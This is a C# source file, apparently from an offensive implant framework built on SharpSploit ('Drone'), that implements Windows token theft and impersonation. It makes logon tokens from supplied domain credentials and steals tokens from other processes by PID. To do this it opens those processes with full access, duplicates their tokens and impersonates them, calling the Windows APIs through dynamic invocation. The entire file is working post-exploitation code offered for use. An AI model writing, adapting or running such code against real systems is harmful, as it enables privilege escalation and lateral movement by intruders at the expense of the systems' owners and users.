using System;
using System.Collections.Generic;
using System.Security.Principal;

using Drone.Invocation.Data;
using Drone.SharpSploit.Generic;

namespace Drone.SharpSploit.Credentials
{
    public class Token : SharpSploitResult, IDisposable
    {
        public string Handle { get; private set; }
        public string Identity { get; private set; }
        public TokenSource Source { get; private set; }

        private IntPtr _handle;

        public enum TokenSource
        {
            MakeToken,
            StealToken
        }

        public bool Create(string domain, string username, string password)
        {
            var token = IntPtr.Zero;

            var success = Invocation.DynamicInvoke.Win32.Advapi32.LogonUserA(username, domain, password,
                Win32.Advapi32.LogonUserType.LOGON32_LOGON_NEW_CREDENTIALS,
                Win32.Advapi32.LogonUserProvider.LOGON32_PROVIDER_DEFAULT,
                ref token);

            if (success)
            {
                _handle = token;
                Handle = $"0x{token.ToInt64()}";
                Identity = $"{domain}\\{username}";
                Source = TokenSource.MakeToken;

                return Impersonate();
            }

            return success;
        }

        public bool Impersonate()
            => Invocation.DynamicInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(_handle);

        public bool Steal(uint pid)
        {
            var hProcess = Invocation.DynamicInvoke.Native.NtOpenProcess(
                pid,
                Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS);

            var hToken = IntPtr.Zero;
            var success = Invocation.DynamicInvoke.Win32.Advapi32.OpenProcessToken(
                hProcess,
                Win32.Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
                ref hToken);

            if (!success)
            {
                Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
                return false;
            }

            var hNewToken = IntPtr.Zero;
            success = Invocation.DynamicInvoke.Win32.Advapi32.DuplicateTokenEx(
                hToken,
                Win32.Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
                Win32.WinNT.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                Win32.WinNT.TOKEN_TYPE.TokenImpersonation,
                ref hNewToken);

            if (!success)
            {
                Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);
                Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
                return false;
            }
            
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);

            _handle = hNewToken;
            Handle = $"0x{_handle.ToInt64()}";
            Identity = new WindowsIdentity(_handle).Name;
            Source = TokenSource.StealToken;

            return Impersonate();
        }

        public static bool Revert()
            => Invocation.DynamicInvoke.Win32.Advapi32.RevertToSelf();

        public void Dispose()
        {
            Revert();
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(_handle);
        }

        protected internal override IList<SharpSploitResultProperty> ResultProperties =>
            new List<SharpSploitResultProperty>
            {
                new() {Name = "Handle", Value = Handle},
                new() {Name = "Identity", Value = Identity},
                new() {Name = "Source", Value = Source}
            };
    }
}